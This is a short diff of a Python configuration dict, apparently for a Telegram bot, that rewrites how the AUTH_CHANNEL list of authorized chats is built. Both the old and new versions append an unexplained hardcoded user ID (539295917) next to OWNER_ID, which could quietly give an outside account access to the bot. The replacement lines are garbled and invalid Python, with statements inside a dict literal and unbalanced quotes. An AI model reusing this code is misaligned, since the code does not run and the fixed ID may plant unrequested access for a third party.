@@ -11,10 +11,10 @@ CONFIG = Config({
     'MAX_LOG_SIZE' : 10 * 1024 * 1024,
     'API_HASH' : None,
     'API_ID' : None,
-    AUTH_CHANNEL = list(Config.AUTH_CHANNEL)
-    AUTH_CHANNEL.append(539295917)
-    AUTH_CHANNEL.append(OWNER_ID)
-    AUTH_CHANNEL = list(set(AUTH_CHANNEL))
+    'AUTH_CHANNEL' = list(Config.AUTH_CHANNEL),
+    'AUTH_CHANNEL.append(539295917),
+    'AUTH_CHANNEL.append(OWNER_ID),
+    'AUTH_CHANNEL' = list(set(AUTH_CHANNEL)),
     'BOT_TOKEN' : None,
     'BOT_PASSWORD' : None,
     'CHAT_ID' : '',
